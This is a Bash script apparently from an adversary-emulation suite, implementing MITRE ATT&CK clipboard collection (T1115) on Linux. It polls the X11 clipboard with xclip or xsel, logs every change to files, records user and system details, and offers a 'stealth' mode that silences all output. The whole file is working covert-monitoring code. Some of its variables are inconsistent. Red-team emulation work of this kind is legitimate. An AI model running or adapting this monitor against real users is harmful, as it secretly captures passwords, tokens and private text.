
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1115_001A_DEBUG_MODE="${T1115_001A_DEBUG_MODE:-false}"
    export T1115_001A_TIMEOUT="${T1115_001A_TIMEOUT:-300}"
    export T1115_001A_FALLBACK_MODE="${T1115_001A_FALLBACK_MODE:-real}"
    export T1115_001A_OUTPUT_FORMAT="${T1115_001A_OUTPUT_FORMAT:-json}"
    export T1115_001A_POLICY_CHECK="${T1115_001A_POLICY_CHECK:-true}"
    export T1115_001A_MAX_FILES="${T1115_001A_MAX_FILES:-200}"
    export T1115_001A_MAX_FILE_SIZE="${T1115_001A_MAX_FILE_SIZE:-1048576}"
    export T1115_001A_SCAN_DEPTH="${T1115_001A_SCAN_DEPTH:-3}"
    export T1115_001A_EXCLUDE_CACHE="${T1115_001A_EXCLUDE_CACHE:-true}"
    export T1115_001A_CAPTURE_DURATION="${T1115_001A_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1115.001a - Clipboard Data: X11 Clipboard History Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Monitor X11 clipboard for sensitive data ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    if ! command -v xclip >/dev/null && ! command -v xsel >/dev/null; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] X11 clipboard tools (xclip or xsel) required"; exit 1
    fi
}

Load-EnvironmentVariables() {
    export T1115_001A_OUTPUT_BASE="${T1115_001A_OUTPUT_BASE:-./mitre_results}"
    export T1115_001A_TIMEOUT="${T1115_001A_TIMEOUT:-300}"
    export T1115_001A_OUTPUT_MODE="${T1115_001A_OUTPUT_MODE:-simple}"
    export T1115_001A_SILENT_MODE="${T1115_001A_SILENT_MODE:-false}"
    export T1115_001A_MAX_ENTRIES="${T1115_001A_MAX_ENTRIES:-100}"
    
    export T1115_001A_DISPLAY_TARGET="${T1115_001A_DISPLAY_TARGET:-${DISPLAY:-:0}}"
    export T1115_001A_MONITOR_DURATION="${T1115_001A_MONITOR_DURATION:-300}"
    export T1115_001A_POLL_INTERVAL="${T1115_001A_POLL_INTERVAL:-5}"
    export T1115_001A_MIN_LENGTH="${T1115_001A_MIN_LENGTH:-10}"
    export T1115_001A_FILTER_SENSITIVE="${T1115_001A_FILTER_SENSITIVE:-true}"
}

Validate-SystemPreconditions() {
    [[ -z "$T1115_001A_OUTPUT_BASE" ]] && { [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1115_001A_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1115_001A_OUTPUT_BASE")" ]] && { [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    [[ -z "$T1115_001A_DISPLAY_TARGET" ]] && { [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] No X11 display available"; return 1; }
    return 0
}

Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1115_001A_OUTPUT_BASE/T1115_001a_x11_clipboard_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{clipboard_data,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

Monitor-X11Clipboard() {
    local collection_dir="$1" duration="$2"
    
    local clipboard_log="$collection_dir/clipboard_data/clipboard_history_$(date +%s).log"
    local previous_content=""
    local entry_count=0
    local end_time=$(($(date +%s) + duration))
    
    while [[ $(date +%s) -lt $end_time && $entry_count -lt ${T1115_001A_MAX_ENTRIES:-100} ]]; do
        local current_content=""
        
        if command -v xclip >/dev/null; then
            current_content=$(xclip -o -selection clipboard 2>/dev/null)
        elif command -v xsel >/dev/null; then
            current_content=$(xsel --clipboard --output 2>/dev/null)
        fi
        
        if [[ -n "$current_content" && "$current_content" != "$previous_content" ]]; then
            if [[ ${#current_content} -ge ${T1115_001A_MIN_LENGTH:-10} ]]; then
                echo "$(date '+%Y-%m-%d %H:%M:%S') - Clipboard changed:" >> "$clipboard_log"
                echo "$current_content" >> "$clipboard_log"
                echo "---" >> "$clipboard_log"
                
                previous_content="$current_content"
                ((entry_count++))
                [[ "$T1115_001A_SILENT_MODE" != "true" ]] && echo "  + Clipboard entry captured" >&2
            fi
        fi
        
        sleep "$T1115_001A_POLL_INTERVAL"
    done
    
    if [[ -f "$clipboard_log" && -s "$clipboard_log" ]]; then
        local file_size=$(stat -c%s "$clipboard_log" 2>/dev/null || echo 0)
        echo "$clipboard_log:$file_size"
        return 0
    fi
    return 1
}

Collect-SystemMetadata() {
    local collection_dir="$1"
    mkdir -p "$collection_dir/metadata" 2>/dev/null || true
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
    echo "DISPLAY=$DISPLAY" > "$collection_dir/metadata/x11_context.txt"
}

Log-ExecutionMessage() {
    # Silent in stealth mode or when T1115_001A_SILENT_MODE is true
    [[ "$T1115_001A_SILENT_MODE" != "true" && "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$1" >&2
}

Generate-SimpleOutput() {
    echo "X11 CLIPBOARD MONITORING "
    echo "Entries: $1"
    echo "Size: $2 bytes"
    echo "Complete"
}

Generate-DebugOutput() {
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1115.001a",
    "results": {
        "entries_captured": $1,
        "total_size_bytes": $2,
        "collection_directory": "$3"
    }
}
EOF
)
    echo "$json_output" > "$3/metadata/results.json"
    [[ "$T1115_001A_SILENT_MODE" != "true" ]] && echo "$json_output"
}

Generate-StealthOutput() { echo "$1" > /dev/null 2>&1; }
Generate-NoneOutput() { :; }
# 4 MAIN ORCHESTRATORS (10-20 lines each)
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    echo "$(Initialize-OutputStructure)"
}

Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Starting X11 clipboard monitoring..."
    
    if result=$(Monitor-X11Clipboard "$collection_dir" "$T1115_001A_MONITOR_DURATION"); then
        IFS=':' read -r file_path file_size <<< "$result"
        collected_files+=("$file_path")
        total_size=$((total_size + file_size))
        ((file_count++))
    fi
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

Write-StandardizedOutput() {
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$2" "$3" "$1" ;;
        "debug")   Generate-DebugOutput "$2" "$3" "$1" ;;
        "stealth") Generate-StealthOutput "$2" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    local collection_dir results
    collection_dir=$(Get-Configuration) || exit 2
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected entries captured"
    exit 0
}

# Enhanced precondition checking with alternatives
Enhanced-Validate-SystemPreconditions() {
    # Check for any clipboard tool available
    local clipboard_available=false
    
    if command -v xclip >/dev/null; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] xclip available for X11 clipboard access" >&2
        clipboard_available=true
    elif command -v wl-clipboard >/dev/null; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] wl-clipboard available for Wayland clipboard access" >&2
        clipboard_available=true
    elif command -v xsel >/dev/null; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] xsel available for X11 clipboard access" >&2
        clipboard_available=true
    elif [[ -n "$DISPLAY" ]]; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] X11 display available, attempting basic clipboard access" >&2
        clipboard_available=true
    elif [[ "$XDG_SESSION_TYPE" == "wayland" ]]; then
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Wayland session detected, attempting basic clipboard access" >&2
        clipboard_available=true
    else
        [[ "${T1115_001A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[WARNING] No clipboard tools available, will simulate clipboard operations"
        # Don't exit, simulate instead
        export SIMULATE_CLIPBOARD="true"
        clipboard_available=true
    fi
    
    if [[ "$clipboard_available" = "true" ]]; then
        return 0
    else
        echo "[SKIPPED] No clipboard access method available"
        return 1
    fi
}

# Replace original function
Validate-SystemPreconditions() { Enhanced-Validate-SystemPreconditions; }

# Execute
Main "$@"
